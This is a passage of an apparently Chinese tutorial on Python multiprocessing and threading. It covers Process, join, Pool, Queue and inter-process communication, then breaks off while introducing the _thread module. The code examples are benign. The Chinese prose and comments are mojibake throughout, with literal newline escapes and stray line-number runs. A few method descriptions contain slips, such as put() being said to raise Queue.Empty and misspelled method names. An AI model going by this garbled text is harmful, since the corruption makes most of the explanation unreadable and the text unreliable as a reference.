åµä¸ï¼ä¼è°ç¨ä¼ éç»Processæé å½æ°çtargetãå®ä¹è¿ç¨çå¦ä¸ç§æ¹æ³æ¯ç»§æ¿Processç±»å¹¶éæ°å®ç°run()å½æ°\nstart()           å¯å¨è¿ç¨ï¼è¿å°è¿è¡ä»£è¡¨è¿ç¨çå­è¿ç¨ï¼å¹¶è°ç¨è¯¥å­è¿ç¨ä¸­çrun()å½æ°\nterminate()       å¼ºå¶ç»æ­¢è¿ç¨ãå¦æè°ç¨æ­¤å½æ°ï¼è¿ç¨på°è¢«ç«å³ç»æ­¢ï¼åæ¶ä¸ä¼è¿è¡ä»»ä½æ¸çå¨ä½ãå¦æè¿ç¨påå»ºäºå®èªå·±çå­è¿ç¨ï¼è¿äºè¿ç¨å°åä¸ºåµå°¸è¿ç¨ãä½¿ç¨æ­¤æ¹æ³æ¶éè¦ç¹å«å°å¿ãå¦æpä¿å­äºä¸ä¸ªéæåä¸äºè¿ç¨é´éä¿¡ï¼é£ä¹ç»æ­¢å®å¯è½ä¼å¯¼è´æ­»éæI/Oæå\n\nåå»ºè¿ç¨çç¤ºä¾ä»£ç ï¼\n\nfrom multiprocessing import Process\n\ndef process_func():\n    print(\"å­è¿ç¨æ§è¡äº\")\n    \nif __name__ == '__main__':\n    p = Process(target=process_func)\n    print(\"ç¶è¿ç¨æ§è¡\")\n    print(\"å­è¿ç¨å³å°æ§è¡\")\n    p.start()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nåå»ºå¸¦åæ°çè¿ç¨ç¤ºä¾ä»£ç ï¼\n\nfrom multiprocessing import Process\nimport os\nfrom time import sleep\n#åå»ºå­è¿ç¨ä»£ç \ndef run_proc(name,age,**kwargs):\n    for i in range(5):\n        print('å­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼%s,age:%d'%(name,age))\n        print('å­å¸åæ°kwargsï¼',kwargs)\n        sleep(0.5)\n\nif __name__=='__main__':\n    print('ä¸»è¿ç¨å¼å§è¿è¡')\n    p=Process(target=run_proc,args=('test',18),kwargs={'m':23})\n    print('å­è¿ç¨å°è¦æ§è¡')\n    p.start()\n    \n    \n\"\"\"\nä¸»è¿ç¨å¼å§è¿è¡\nå­è¿ç¨å°è¦æ§è¡\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\nå­è¿ç¨è¿è¡ä¸­ï¼åæ°nameï¼test,age:18\nå­å¸åæ°kwargsï¼ {'m': 23}\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nJoinçç¨æ³ï¼joinè¡¨ç¤ºçç­å¾ä¸ä¸ªè¿ç¨ç»æè¿è¡ãå¦æå¨ä¸»è¿ç¨ä¸­è°ç¨äºæä¸ªè¿ç¨joinæ¹æ³ï¼åä¼ç­å­è¿ç¨æ§è¡å®æä¹åæä¼ç»§ç»­æ§è¡ä¸»è¿ç¨ã\n\nfrom multiprocessing import Process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = Process(target = worker, args = (3,))\n    p.start()\n    #ç­å¾è¿ç¨pç»æ­¢\n    p.join()\n    print(\"ä¸»è¿ç¨ç»æ!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njoinä¸­çåæ°å¯ä»¥æ·»å ä¸ä¸ªè¶æ¶æ¶é´ï¼å¦æè¶è¿è¿ä¸ªæ¶é´å°±ä¸ç»§ç»­ç­å¾äºã\n\nfrom multiprocessing import Process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = Process(target = worker, args = (5,))\n    p.start()\n    #ç­å¾è¿ç¨pç»æ­¢\n    p.join(3)\n    print(\"ä¸»è¿ç¨ç»æ!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nProcesså¯¹è±¡çå®ä¾å±æ§å¦ä¸è¡¨æç¤ºï¼\n\nå±æ§     æè¿°\nname   è¿ç¨çåç§°\npid    è¿ç¨çæ´æ°è¿ç¨ID\n\nç¤ºä¾ä»£ç ï¼\n\n#å¯¼å¥æ¨¡å\nimport multiprocessing\nimport time\n#å®ä¹è¿ç¨æ§è¡å½æ°\ndef clock(interval):\n    for i in range(5):\n        print('å½åæ¶é´ä¸º{0}ï¼'.format(time.ctime()))\n        time.sleep(interval)\nif __name__=='__main__':\n    #åå»ºè¿ç¨\n    p=multiprocessing.Process(target=clock,args=(1,))\n    #å¯å¨è¿ç¨\n    p.start()\n    p.join()\n    #è·åè¿ç¨çID\n    print('p.id:',p.pid)\n    #è·åè¿ç¨çåç§°\n    print('p.name:',p.name)\n    #å¤æ­è¿ç¨æ¯å¦è¿è¡\n    print('p.is_alive:',p.is_alive())\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nåå»ºå¤ä¸ªå½æ°è¿ç¨ï¼\n\n#å¯¼å¥æ¨¡å\nimport multiprocessing\nimport time\n#åå»ºè¿ç¨è°ç¨å½æ°\ndef work1(interval):\n    print('work1')\n    time.sleep(interval)\n    print('end work1')\ndef work2(interval):\n    print('work2')\n    time.sleep(interval)\n    print('end work2')\ndef work3(interval):\n    print('work3')\n    time.sleep(interval)\n    print('end work3')\nif __name__=='__main__':\n    #åå»ºè¿ç¨å¯¹è±¡\n    p1=multiprocessing.Process(target=work1,args=(4,))\n    p2=multiprocessing.Process(target=work2,args=(3,))\n    p3=multiprocessing.Process(target=work3,args=(2,))\n    #å¯å¨è¿ç¨\n    p1.start()\n    p2.start()\n    p3.start()\n    p1.join()\n    p2.join()\n    p3.join()\n    print('ä¸»è¿ç¨ç»æ')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# ç»§æ¿Processæ¹å¼åå»ºè¿ç¨\n\nåå»ºè¿ç¨çæ¹å¼è¿å¯ä»¥ä½¿ç¨ç±»çæ¹å¼ï¼å¯ä»¥èªå®ä¹ä¸ä¸ªç±»ï¼ç»§æ¿Processç±»ï¼æ¯æ¬¡å®ä¾åè¿ä¸ªç±»çæ¶åï¼å°±ç­åäºå®ä¾åä¸ä¸ªè¿ç¨å¯¹è±¡ã\n\n#å¯¼å¥æ¨¡å\nfrom multiprocessing import Process\nimport time\n#å®ä¹çº¿ç¨ç±»\nclass ClockProcess(Process):\n    def __init__(self,interval):\n        Process.__init__(self)\n        self.interval=interval\n    def run(self):\n        print('å­è¿ç¨å¼å§æ§è¡çæ¶é´:{}'.format(time.ctime()))\n        time.sleep(self.interval)\n        print('å­è¿ç¨ç»æçæ¶é´:{}'.format(time.ctime()))\n\nif __name__=='__main__':\n    #åå»ºè¿ç¨\n    p=ClockProcess(2)\n    #å¯å¨è¿ç¨\n    p.start()\n    p.join()\n    print('ä¸»è¿ç¨ç»æ')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# è¿ç¨æ± \n\nå¨å©ç¨Pythonè¿è¡ç³»ç»ç®¡ççæ¶åï¼ç¹å«æ¯åæ¶æä½å¤ä¸ªæä»¶ç®å½ï¼æèè¿ç¨æ§å¶å¤å°ä¸»æºï¼å¹¶è¡æä½å¯ä»¥èçº¦å¤§éçæ¶é´ãå½è¢«æä½å¯¹è±¡æ°ç®ä¸å¤§æ¶ï¼å¯ä»¥ç´æ¥å©ç¨multiprocessingä¸­çProcesså¨ææçå¤ä¸ªè¿ç¨ï¼åå ä¸ªè¿å¥½ï¼ä½å¦ææ¯ä¸ç¾ä¸ªï¼ä¸åä¸ªç®æ ï¼æå¨çå»éå¶è¿ç¨æ°éå´åå¤ªè¿ç¹çï¼æ­¤æ¶å¯ä»¥åæ¥è¿ç¨æ± çåæã\n\nPoolå¯ä»¥æä¾æå®æ°éçè¿ç¨ï¼ä¾ç¨æ·è°ç¨ï¼å½ææ°çè¯·æ±æäº¤å°poolä¸­æ¶ï¼å¦ææ± è¿æ²¡ææ»¡ï¼é£ä¹å°±ä¼åå»ºä¸ä¸ªæ°çè¿ç¨ç¨æ¥æ§è¡è¯¥è¯·æ±ï¼ä½å¦ææ± ä¸­çè¿ç¨æ°å·²ç»è¾¾å°è§å®æå¤§å¼ï¼é£ä¹è¯¥è¯·æ±å°±ä¼ç­å¾ï¼ç´å°æ± ä¸­æè¿ç¨ç»æï¼æä¼åå»ºæ°çè¿ç¨ãPoolçè¯­æ³æ ¼å¼å¦ä¸ï¼\n\nPoolï¼[numprocess [, initializer [, initargs]]]ï¼\n# numprocess è¿ç¨ä¸ªæ° å¦æå¦æçç¥ åä½¿ç¨cpu_count()çå¼\n# Initializeræ¯ä¸ªå·¥ä½è¿ç¨å¯å¨æ¶è¦è°ç¨çå¯¹è±¡\n# initargs è°ç¨è¿ç¨æ¶çåæ°\n\n\n1\n2\n3\n4\n\n\nPoolç±»æå¦ä¸çå®ä¾æ¹æ³ï¼\n\næ¹æ³                                                    æè¿°\napplyï¼func [,args [,kwargs]]ï¼                         å¨ä¸ä¸ªæ± å·¥ä½è¿ç¨ä¸­æ§è¡å½æ°ï¼*argsï¼**kwargsï¼ï¼ç¶åè¿åç»æã\napply_asyncï¼func [, args [,kwargs [,callback ] ] ]ï¼   å¨ä¸ä¸ªæ± å·¥ä½è¿ç¨ä¸­å¼æ­¥å°æ§è¡å½æ°ï¼*argsï¼**kwargsï¼ï¼ç¶åè¿åç»æãæ­¤æ¹æ³çç»ææ¯AsyncResultç±»çå®ä¾ï¼ç¨åå¯ç¨äºè·å¾æç»ç»æãCallbackæ¯å¯è°ç¨å¯¹è±¡ï¼æ¥åè¾å¥åæ°ãå½funcçç»æåä¸ºå¯ç¨æ¶ï¼å°ç«å³ä¼ éç»callbackãCallbackç¦æ­¢æ§è¡ä»»ä½é»å¡æä½ï¼å¦åå°é»å¡æ¥æ¶å¶ä»å¼æ­¥æä½ä¸­çç»æ\nclose()                                               å³é­è¿ç¨æ± ï¼é²æ­¢è¿è¡è¿ä¸æ­¥æä½ãå¦æè¿ææèµ·çæä½ï¼å®ä»¬å°å¨å·¥ä½è¿ç¨ç»æ­¢ä¹åå®æ\njoin()                                                ç­å¾ææå·¥ä½è¿ç¨éåºãæ­¤æ¹æ³åªè½å¨closeï¼ï¼æèterminateï¼ï¼æ¹æ³ä¹åè°ç¨\nimap( funcï¼iterable [ ,chunksize] )                   mapï¼ï¼å½æ°ççæ¬ä¹ä¸ï¼è¿åè¿­ä»£å¨èéç»æåè¡¨\nimap_unordered( funcï¼iterable [ï¼chunksize] )          åimapï¼ï¼å½æ°ä¸æ ·ï¼åªæ¯ç»æçé¡ºåºæ ¹æ®ä»å·¥ä½è¿ç¨æ¥æ¶å°çæ¶é´ä»»æç¡®å®\nmap( funcï¼iterable [ï¼chunksize] )                     å°å¯è°ç¨å¯¹è±¡funcåºç¨ç»iterableä¸­çææé¡¹ï¼ç¶åä»¥åè¡¨çå½¢å¼è¿åç»æãéè¿å°iterableååä¸ºå¤åå¹¶å°å·¥ä½åæ´¾ç»å·¥ä½è¿ç¨ï¼å¯ä»¥å¹¶è¡å°æ§è¡è¿é¡¹æä½ãchunksizeæå®æ¯åä¸­çé¡¹æ°ãå¦ææ°éè¾å¤§ï¼å¯ä»¥å¢å¤§chunksizeçå¼æ¥æåæ§è½\nmap_async( funcï¼iterable [ï¼chunksize [ï¼callback]] )   åmapï¼ï¼å½æ°ï¼ä½ç»æçè¿åæ¯å¼æ­¥çãè¿åå¼æ¯AsyncResultç±»çå®ä¾ï¼ç¨åå¯ç¨ä¸è·åç»æãCallbackæ¯ææ¥åä¸ä¸ªåæ°çå¯è°å¯¹è±¡ãå¦ææä¾callableï¼å½ç»æåä¸ºå¯ç¨æ¶ï¼å°ä½¿ç¨ç»æè°ç¨callable\nterminate()                                           ç«å³ç»æ­¢ææå·¥ä½è¿ç¨ï¼åæ¶ä¸æ§è¡ä»»ä½æ¸çæç»æä»»ä½æèµ·å·¥ä½ãå¦æpè¢«åå¾åæ¶ï¼å°èªå¨è°ç¨æ­¤å½æ°\nget( [ timeout] )                                     è¿åç»æï¼å¦ææå¿è¦åç­å¾ç»æå°è¾¾ãTimeoutæ¯å¯éçè¶æ¶ãå¦æç»æå¨æå®æ¶é´åæ²¡æå°è¾¾ï¼å°å¼åmultiprocessing.TimeoutErrorå¼å¸¸ãå¦æè¿ç¨æä½ä¸­å¼åäºå¼å¸¸ï¼å®å°å¨è°ç¨æ­¤æ¹æ³æ¶åæ¬¡è¢«å¼å\nready()                                               å¦æè°ç¨å®æï¼åè¿åTrue\nsucessful()                                           å¦æè°ç¨å®æä¸æ²¡æå¼åå¼å¸¸ï¼è¿åTrueãå¦æå¨ç»æå°±ç»ªä¹åè°ç¨æ­¤æ¹æ³ï¼å°å¼åAssertionErrorå¼å¸¸\nwait( [timeout] )                                     ç­å¾ç»æåä¸ºå¯ç¨ãTimeoutæ¯å¯éçè¶æ¶\n\nåå»ºéé»å¡çè¿ç¨æ± ï¼\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"endï¼\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.Pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #ç»´ææ§è¡çè¿ç¨æ»æ°ä¸ºprocessesï¼å½ä¸ä¸ªè¿ç¨æ§è¡å®æ¯åä¼æ·»å æ°çè¿ç¨è¿å»\n        pool.apply_async(func, (msg, ))\n\n    pool.close()#è¿ç¨æ± å³é­ä¹åä¸åæ¥æ¶æ°çè¯·æ±\n    #è°ç¨joinä¹åï¼åè°ç¨closeå½æ°ï¼å¦åä¼åºéã\n    # æ§è¡å®closeåä¸ä¼ææ°çè¿ç¨å å¥å°pool,joinå½æ°ç­å¾ææå­è¿ç¨ç»æ\n    pool.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\né»å¡çè¿ç¨æ± ï¼\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"end\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.Pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #ç»´ææ§è¡çè¿ç¨æ»æ°ä¸ºprocessesï¼å½ä¸ä¸ªè¿ç¨æ§è¡å®æ¯åä¼æ·»å æ°çè¿ç¨è¿å»\n        pool.apply(func, (msg, ))\n\n    pool.close()\n    #è°ç¨joinä¹åï¼åè°ç¨closeå½æ°ï¼å¦åä¼åºéã\n    # æ§è¡å®closeåä¸ä¼ææ°çè¿ç¨å å¥å°pool,joinå½æ°ç­å¾ææå­è¿ç¨ç»æ\n    # pool.join()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# è¿ç¨é´çéä¿¡\n\nå¨å±åéå¨å¤ä¸ªè¿ç¨ä¸­ä¸å±äº«ï¼è¿ç¨ä¹é´çæ°æ®æ¯ç¬ç«çï¼é»è®¤æåµä¸äºä¸å½±åã\n\nå¤ä¸ªè¿ç¨ä¸­çæ°æ®ä¸å±äº«ï¼\n\nfrom multiprocessing import Process\nnum=1\ndef work1():\n    global num\n    num+=5\n    print('å­è¿ç¨1è¿è¡ï¼num:',num)\n\ndef work2():\n    global num\n    num += 10\n    print('å­è¿ç¨2è¿è¡ï¼numï¼',num)\n\nif __name__=='__main__':\n    print('ç¶è¿ç¨å¼å§è¿è¡')\n    p1=Process(target=work1)\n    p2=Process(target=work2)\n    p1.start()\n    p2.start()\n    p1.join()\n    p2.join()\n\"\"\"\nç¶è¿ç¨å¼å§è¿è¡\nå­è¿ç¨1è¿è¡ï¼num: 6\nå­è¿ç¨2è¿è¡ï¼numï¼ 11\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nQueueæ¯å¤è¿ç¨å®å¨çéåï¼å¯ä»¥ä½¿ç¨Queueå®ç°å¤è¿ç¨ä¹é´çæ°æ®ä¼ éãputæ¹æ³ç¨ä»¥æå¥æ°æ®å°éåä¸­ï¼putæ¹æ³è¿æä¸¤ä¸ªå¯éåæ°ï¼blockedåtimeoutãå¦æblockedä¸ºTrueï¼é»è®¤å¼ï¼ï¼å¹¶ä¸timeoutä¸ºæ­£å¼ï¼è¯¥æ¹æ³ä¼é»å¡timeoutæå®çæ¶é´ï¼ç´å°è¯¥éåæå©ä½çç©ºé´ãå¦æè¶æ¶ï¼ä¼æåºQueue.fullå¼å¸¸ãå¦æblockedä¸ºFalseï¼ä½è¯¥Queueå·²æ»¡ï¼ä¼ç«å³æåºQueue.fullå¼å¸¸ã\n\ngetæ¹æ³å¯ä»¥ä»éåè¯»åå¹¶ä¸å é¤ä¸ä¸ªåç´ ãåæ ·ï¼getæ¹æ³æä¸¤ä¸ªå¯éåæ°ï¼blockedåtimeoutãå¦æblockedä¸ºTrueï¼é»è®¤å¼ï¼ï¼å¹¶ä¸timeoutä¸ºæ­£å¼ï¼é£ä¹å¨ç­å¾æ¶é´åæ²¡æåå°ä»»ä½åç´ ï¼ä¼æåºQueue.Emptyå¼å¸¸ãå¦æblockedä¸ºFalseï¼æä¸¤ç§æåµå­å¨ï¼å¦æQueueæä¸ä¸ªå¼å¯ç¨ï¼åç«å³è¿åè¯¥å¼ï¼å¦åï¼å¦æéåä¸ºç©ºï¼åç«å³æåºQueue.Emptyå¼å¸¸ã\n\nQueueçå®ä¾æ¹æ³ï¼\n\næ¹æ³                                 æè¿°\ncancle_join_thread()               ä¸ä¼å¨è¿ç¨éåºæ¶èªå¨è¿æ¥åå°çº¿ç¨ãè¿å¯ä»¥é²æ­¢join_thread()æ¹æ³é»å¡\nclose()                            å³é­éåï¼é²æ­¢éåä¸­å å¥æ´å¤æ°æ®ãè°ç¨æ­¤æ¹æ³æ¶ï¼åå°çº¿ç¨å°ç»§ç»­åå¥é£äºå·²å¥éåå°æªåå¥æ°æ®ï¼ä½å°å¨æ­¤æ¹æ³å®ææ¶é©¬ä¸å³é­\nempty()                            å¦æè°ç¨æ­¤æ¹æ³æ¶qä¸ºç©ºï¼è¿åTrue\nfull()                             å¦æqå·²æ»¡ï¼è¿åTrue\nget([block [,timeout])             è¿åqä¸­çä¸ä¸ªé¡¹ãå¦æqä¸ºç©ºï¼æ­¤æ¹æ³å°é»å¡ï¼ç´å°éåä¸­æé¡¹å¯ç¨ä¸ºæ­¢ãBlockç¨äºæ§å¶é»å¡è¡ä¸ºï¼é»è®¤ä¸ºTrueãå¦æè®¾ç½®ä¸ºFalseï¼å°å¼åQueue.Emptyå¼å¸¸(å®ä¹å¨Queueæ¨¡åä¸­)ãTimeoutæ¯å¯éè¶æ¶æ¶é´ï¼ç¨å¨é»å¡æ¨¡å¼ä¸­ãå¦æå¨æå®çæ¶é´é´éåæ²¡æé¡¹åä¸ºå¯ç¨ï¼å°å¼åQueue.Emptyå¼å¸¸\njoin_thread()                      è¿æ¥éåçåå°çº¿ç¨ãæ­¤æ¹æ³ç¨äºå¨è°ç¨q.close()æ¹æ³ä¹åï¼ç­å¾ææéåé¡¹è¢«æ¶èãé»è®¤æåµä¸æ­¤æ¹æ³ç±ä¸æ¯qçåå§åå»ºèçææè¿ç¨è°ç¨ãè°ç¨q.cancle_join_thread()æ¹æ³å¯ä»¥ç¦æ­¢è¿ç§è¡ä¸º\nput(item [ , block [, timeout]])   å°itemæ¾å¥éåãå¦æéåå·²æ»¡ï¼æ­¤æ¹æ³å°é»å¡è³æç©ºé´å¯ç¨ä¸ºæ­¢ãBlockæ§å¶é»å¡è¡ä¸ºï¼é»è®¤ä¸ºTrueãå¦æè®¾ç½®ä¸ºFalseï¼å°å¼åQueue.Emptyå¼å¸¸(å®ä¹å¨Queueæ¨¡åä¸­)ãTimeoutæå®å¨é»å¡æ¨¡å¼ä¸­ç­å¾å¯ç¨æ¶ç©ºé´çæ¶é´é¿ç­ãè¶æ¶åå°å¼åQueue.Fullå¼å¸¸ã\nqsize()                            è¿åç®åéåä¸­é¡¹çæ­£ç¡®æ°éã\njoinableQueue([maxsize])           åå»ºå¯è¿æ¥çå±äº«è¿ç¨éåãè¿å°±åæ¯ä¸ä¸ªQueueå¯¹è±¡ï¼ä½éååè®¸é¡¹çæ¶è´¹èéç¥çäº§èé¡¹å·²ç»è¢«æåå¤çãéç¥è¿ç¨æ¯ä½¿ç¨å±äº«çä¿¡å·åæ¡ä»¶åéæ¥å®ç°ç\ntask_done()                        æ¶è´¹èä½¿ç¨æ­¤æ¹æ³ååºä¿¡å·ï¼è¡¨ç¤ºq.get()è¿åçé¡¹å·²ç»è¢«å¤çãå¦æè°ç¨æ­¤æ¹æ³çæ¬¡æ°å¤§äºä»éåä¸­å é¤çé¡¹çæ°éï¼å°å¼åValueErrorå¼å¸¸\njoin()                             çäº§èä½¿ç¨æ­¤æ¹æ³è¿è¡é»å¡ï¼ç¥ééåä¸­çææé¡¹åè¢«å¤çãé»å¡å°æç»­å°ä½éåä¸­çæ¯ä¸ªé¡¹åè°ç¨q.task_done()æ¹æ³ä¸ºæ­¢\n\nä½¿ç¨æ¹æ³ï¼\n\nfrom multiprocessing import Queue\nq=Queue(3)\nq.put('æ¶æ¯1')\nq.put('æ¶æ¯2')\nprint('æ¶æ¯éåæ¯å¦å·²æ»¡ï¼',q.full())\nq.put('æ¶æ¯3')\nprint('æ¶æ¯éåæ¯å¦å·²æ»¡ï¼',q.full())\n\n# q.put('æ¶æ¯4')å ä¸ºæ¶æ¯éåå·²æ»¡ï¼éè¦ç´æ¥åå¥éè¦ç­å¾ï¼å¦æè¶æ¶ä¼æåºå¼å¸¸ï¼\n# æä»¥åå¥æ¶åéå¤æ­ï¼æ¶æ¯éåæ¯å¦å·²æ»¡\nif not q.full():\n    q.put('æ¶æ¯4')\n\n#åçè¯»åæ¶æ¯æ¶ï¼åå¤æ­æ¶æ¯éåæ¯å¦ä¸ºç©ºï¼åè¯»å\nif not q.empty():\n    for i in range(q.qsize()):\n        print(q.get())\n        \n\"\"\"\næ¶æ¯éåæ¯å¦å·²æ»¡ï¼ False\næ¶æ¯éåæ¯å¦å·²æ»¡ï¼ True\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nå®ç°è¿ç¨é´çéä¿¡æ¹æ³ï¼\n\nfrom multiprocessing import *\nimport time\ndef write(q):\n    #å°åè¡¨ä¸­çåç´ åå¥éåä¸­\n    for i in [\"a\",\"b\",\"c\"]:\n        print('å¼å§åå¥å¼%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#è¯»å\ndef read(q):\n    print('å¼å§è¯»å')\n    while True:\n        if not q.empty():\n            print('è¯»åå°:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #åå»ºéå\n    q=Queue()\n    #åå»ºåå¥è¿ç¨\n    pw=Process(target=write,args=(q,))\n    pr=Process(target=read,args=(q,))\n    #å¯å¨è¿ç¨\n    pw.start()\n    pw.join()\n    pr.start()\n    pr.join()\n    \n\"\"\"\nå¼å§åå¥å¼a\nå¼å§åå¥å¼b\nå¼å§åå¥å¼c\nå¼å§è¯»å\nè¯»åå°: a\nè¯»åå°: b\nè¯»åå°: c\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nå¦æä½¿ç¨Poolåå»ºè¿ç¨ï¼å°±éè¦ä½¿ç¨multiprocessing.Manager()ä¸­çQueue()æ¥å®æè¿ç¨é´çéä¿¡ï¼èä¸æ¯multiprocessing.Queue()ï¼å¦åä¼æåºå¦ä¸å¼å¸¸ã\n\nRuntimeError: Queue objects should only be shared between processes through inheritance\n\nåå»ºè¿ç¨æ± ï¼å®æè¿ç¨é´çéä¿¡ï¼\n\nfrom multiprocessing import Manager,Pool\nimport time\ndef write(q):\n    #å°åè¡¨ä¸­çåç´ åå¥éåä¸­\n    for i in [\"a\",\"b\",\"c\"]:\n        print('å¼å§åå¥å¼%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#è¯»å\ndef read(q):\n    print('å¼å§è¯»å')\n    while True:\n        if not q.empty():\n            print('è¯»åå°:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #åå»ºéå\n    q=Manager().Queue()\n    #åå»ºè¿ç¨æ± \n    p=Pool(3)\n    #ä½¿ç¨é»å¡æ¨¡å¼åå»ºè¿ç¨\n    p.apply(write,(q,))\n    p.apply(read,(q,))\n    p.close()\n    p.join()\n\n\"\"\"\nå¼å§åå¥å¼a\nå¼å§åå¥å¼b\nå¼å§åå¥å¼c\nå¼å§è¯»å\nè¯»åå°: a\nè¯»åå°: b\nè¯»åå°: c\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# çº¿ç¨\n\nçº¿ç¨ä¹æ¯å®ç°å¤ä»»å¡çä¸ç§æ¹å¼ï¼ä¸ä¸ªè¿ç¨ä¸­ï¼ä¹ç»å¸¸éè¦åæ¶åå¤ä»¶äºï¼å°±éè¦åæ¶è¿è¡å¤ä¸ªå­ä»»å¡ï¼è¿äºå­ä»»å¡å°±æ¯çº¿ç¨ãä¸ä¸ªè¿ç¨å¯ä»¥æ¥æå¤ä¸ªå¹¶è¡ççº¿ç¨ï¼å¶ä¸­æ¯ä¸ä¸ªçº¿ç¨ï¼å±äº«å½åè¿ç¨çèµæºã\n\nåºå«     è¿ç¨                                çº¿ç¨\næ ¹æ¬åºå«   ä½ä¸ºèµæºåéçåä½                         è°åº¦åæ§è¡çåä½\nå¼é     æ¯ä¸ä¸ªè¿ç¨é½æç¬ç«çä»£ç åæ°æ®ç©ºé´ï¼è¿ç¨é´çåæ¢ä¼æè¾å¤§çå¼é   çº¿ç¨å¯ä»¥çåºæ¯è½»éçº§çè¿ç¨ï¼å¤ä¸ªçº¿ç¨å±äº«åå­ï¼çº¿ç¨åæ¢çå¼éå°\næå¤ç¯å¢   å¨æä½ç³»ç»ä¸­ï¼åæ¶è¿è¡çå¤ä¸ªä»»å¡                  å¨ç¨åºä¸­å¤ä¸ªé¡ºåºæµåæ¶æ§è¡\nåéåå­   ç³»ç»å¨è¿è¡çæ¶åä¸ºæ¯ä¸ä¸ªè¿ç¨åéä¸åçåå­åºå           çº¿ç¨æä½¿ç¨çèµæºæ¯ä»æå±è¿ç¨çèµæº\nåå«å³ç³»   ä¸ä¸ªè¿ç¨åå¯ä»¥æ¥æå¤ä¸ªçº¿ç¨                     çº¿ç¨æ¯è¿ç¨çä¸é¨åï¼ææçº¿ç¨ææ¶åç§°ä¸ºæ¯è½»éçº§çè¿ç¨\n\nè¿ç¨åçº¿ç¨å¨ä½¿ç¨ä¸åæä¼ç¼ºç¹ï¼çº¿ç¨æ§è¡å¼éå°ï¼ä½ä¸å©äºèµæºçç®¡çåä¿æ¤ï¼èè¿ç¨æ­£ç¸åã\n\nå¨Pythonç¨åºä¸­ï¼å¯ä»¥éè¿â_threadâåthreadingï¼æ¨èä½¿ç¨ï¼è¿ä¸¤ä¸ªæ¨¡åæ¥å¤ççº¿ç¨ãå¨Python3ä¸­ï¼threadæ¨¡åå·²ç»åºå¼ãå¯ä»¥ä½¿ç¨threadingæ¨¡åä»£æ¿ãæä»¥ï¼å¨Python3ä¸­ä¸è½åä½¿ç¨threadæ¨¡åï¼ä½æ¯ä¸ºäºå¼å®¹Python3ä»¥åçç¨åºï¼å¨Python3ä¸­å°threadæ¨¡åéå½åä¸ºâ_threadâã\n\n\n# _threadæ¨¡å\n\nå¨Pythonç¨åºä¸­ï¼å¯ä»¥éè¿ä¸¤ç§æ¹å¼æ¥ä½¿ç¨çº¿ç¨ï¼ä½¿ç¨å½æ°æèä½¿ç¨ç±»æ¥åè£çº¿ç¨å¯¹è±¡ãå½ä½¿ç¨threadæ¨¡åæ¥å¤ççº¿ç¨æ¶ï¼å¯ä»¥è°ç¨éé¢çå½æ°start_new_thread()æ¥çæä¸ä¸ªæ°ççº¿ç¨ï¼è¯­æ³æ ¼å¼å¦ä¸ï¼\n\n_thread.start_new_thread ( function, args[, kwargs] )\n# functionæ¯çº¿ç¨å½æ°\n# argsè¡¨ç¤ºä¼ 